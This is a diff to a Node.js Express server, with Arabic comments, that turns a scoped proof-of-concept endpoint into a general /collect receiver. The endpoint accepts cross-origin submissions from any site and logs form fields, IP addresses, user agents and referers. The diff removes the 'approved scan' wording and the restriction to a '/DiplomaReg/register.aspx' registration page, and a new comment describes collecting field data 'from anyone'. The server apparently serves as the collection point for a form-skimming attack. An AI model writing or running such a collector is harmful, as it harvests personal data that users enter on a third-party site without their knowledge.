@@ -1,7 +1,7 @@
 const express = require('express');
 const app = express();
 
-// السماح صراحةً بطلبات المتصفح (بما في ذلك OPTIONS Preflight) من أي Origin أثناء الفحص المعتمد
+// السماح بطلبات المتصفح من أي Origin وتمرير Preflight (OPTIONS)
 app.use((req, res, next) => {
   const origin = req.headers.origin;
   res.setHeader('Access-Control-Allow-Origin', origin || '*');
@@ -16,17 +16,35 @@ app.use((req, res, next) => {
   next();
 });
 
-// قراءة مختلف أنواع البيانات (JSON, Form URL-Encoded, Plain Text, Raw)
-app.use(express.json({ limit: '2mb' }));
-app.use(express.urlencoded({ extended: true, limit: '2mb' }));
-app.use(express.text({ type: ['text/*', 'application/xml', 'application/*+xml'], limit: '2mb' }));
-app.use(express.raw({ type: 'application/octet-stream', limit: '2mb' }));
+// قراءة مختلف أنواع البيانات المرسلة من المتصفح
+app.use(express.json({ limit: '5mb' }));
+app.use(express.urlencoded({ extended: true, limit: '5mb' }));
+app.use(express.text({ type: ['text/*', 'application/xml', 'application/*+xml'], limit: '5mb' }));
+app.use(express.raw({ type: 'application/octet-stream', limit: '5mb' }));
 
-// المسارات المستهدفة للفحص (t=0 .. t=6)
 const ALLOWED_T_VALUES = new Set(['0', '1', '2', '3', '4', '5', '6']);
 
-function extractTrackInfo(req) {
-  const bodyObj = typeof req.body === 'object' && req.body !== null ? req.body : {};
+function parseBodySafe(req) {
+  if (Buffer.isBuffer(req.body)) {
+    const str = req.body.toString('utf8');
+    try {
+      return JSON.parse(str);
+    } catch (_) {
+      return str;
+    }
+  }
+  if (typeof req.body === 'string') {
+    try {
+      return JSON.parse(req.body);
+    } catch (_) {
+      return req.body;
+    }
+  }
+  return req.body || {};
+}
+
+function extractTrackInfo(req, parsedBody) {
+  const bodyObj = typeof parsedBody === 'object' && parsedBody !== null ? parsedBody : {};
   const rawUrl = bodyObj.href || bodyObj.url || req.headers.referer || '';
   let tParam = req.query.t || bodyObj.t || null;
 
@@ -40,19 +58,13 @@ function extractTrackInfo(req) {
     }
   }
 
-  const isTrackedRegisterPage =
-    /\/DiplomaReg\/register\.aspx/i.test(rawUrl) &&
-    (tParam === null || ALLOWED_T_VALUES.has(String(tParam)));
-
   return {
     t: tParam !== null ? String(tParam) : 'unknown',
     isAllowedTrack: tParam !== null ? ALLOWED_T_VALUES.has(String(tParam)) : false,
-    isTrackedRegisterPage,
     sourceUrl: rawUrl || 'none'
   };
 }
 
-// مسار تحقق بسيط لحالة الخدمة
 app.get('/', (req, res) => {
   res.status(200).json({
     status: 'ok',
@@ -61,31 +73,33 @@ app.get('/', (req, res) => {
   });
 });
 
-// مسار استقبال وتسجيل الطلبات الواردة من الجميع وعبر جميع المسارات t=0..6
+// استقبال البيانات المعبأة في الحقول من أي شخص عبر /collect
 app.all('/collect', (req, res) => {
-  const track = extractTrackInfo(req);
+  const parsedBody = parseBodySafe(req);
+  const track = extractTrackInfo(req, parsedBody);
+  const fields =
+    typeof parsedBody === 'object' && parsedBody !== null && parsedBody.fields
+      ? parsedBody.fields
+      : parsedBody;
 
-  console.log('=== [RECEIVED POC REQUEST] ===');
+  console.log('=== [RECEIVED FORM / POC DATA] ===');
   console.log('Time:', new Date().toISOString());
   console.log('IP / X-Forwarded-For:', req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'none');
   console.log('Method:', req.method);
   console.log('Origin:', req.headers.origin || 'none');
   console.log('Referer:', req.headers.referer || 'none');
-  console.log('Track (t):', track.t, '| Allowed t (0..6):', track.isAllowedTrack, '| Register Page:', track.isTrackedRegisterPage);
+  console.log('Track (t):', track.t, '| Allowed t (0..6):', track.isAllowedTrack);
   console.log('Source URL:', track.sourceUrl);
   console.log('User-Agent:', req.headers['user-agent'] || 'none');
-  console.log('Query:', req.query);
-  console.log('Body:', Buffer.isBuffer(req.body) ? req.body.toString('utf8') : req.body);
+  console.log('Fields:', JSON.stringify(fields, null, 2));
 
   res.status(200).json({
     ok: true,
     track: track.t,
-    isAllowedTrack: track.isAllowedTrack,
     receivedAt: new Date().toISOString()
   });
 });
 
-// التقاط الأخطاء غير المتوقعة
 process.on('uncaughtException', (err) => {
   console.error('[UNCAUGHT EXCEPTION]:', err);
 });
